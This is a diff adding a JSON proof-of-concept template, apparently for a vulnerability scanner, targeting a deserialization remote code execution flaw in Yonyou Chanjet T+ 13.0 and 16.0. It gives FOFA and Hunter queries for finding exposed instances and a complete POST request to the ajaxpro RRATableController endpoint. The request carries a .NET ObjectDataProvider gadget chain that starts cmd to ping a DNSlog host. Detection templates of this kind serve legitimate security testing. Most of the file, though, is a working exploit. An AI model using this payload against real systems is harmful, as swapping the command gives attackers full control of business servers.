@@ -1,0 +1,41 @@
+{
+  "product": "用友畅捷通TPlus",
+  "vul_name": "用友畅捷通TPlus RRATableController,Ufida.T.DI.UIP.ashx 反序列化",
+  "type": "反序列化",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "畅捷通T+ RRATableController,Ufida.T.DI.UIP.ashx 反序列化RCE漏洞。T+是用友畅捷通推出的一款新型互联网企业管理系统，T+能够满足成长型小微企业对其灵活业务流程的管控需求，重点解决往来业务管理、订单跟踪、资金、库存等管理难题。用户可以通过各种固定或移动设备随时随地迅速获取企业实时、动态的运营信息。该系统/tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx接口存在反序列化RCE漏洞，会导致主机沦陷。",
+  "version": "畅捷通 T+ 13.0、畅捷通 T+ 16.0",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"畅捷通-TPlus\"",
+    "Hunter": "app.name=\"畅捷通 T+\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_34780861/article/details/136921246",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "dnslog",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore",
+      "header": {
+        "Content-Type": "application/json"
+      },
+      "data": "\n{\n  \"storeID\":{\n    \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n    \"MethodName\":\"Start\",\n    \"ObjectInstance\":{\n        \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n        \"StartInfo\": {\n            \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n            \"FileName\":\"cmd\", \"Arguments\":\"/c ping {{m:rep}}\"\n       }\n    }\n  }\n}"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "model": "dnslog"
+        }
+      ]
+    }
+  }
+}
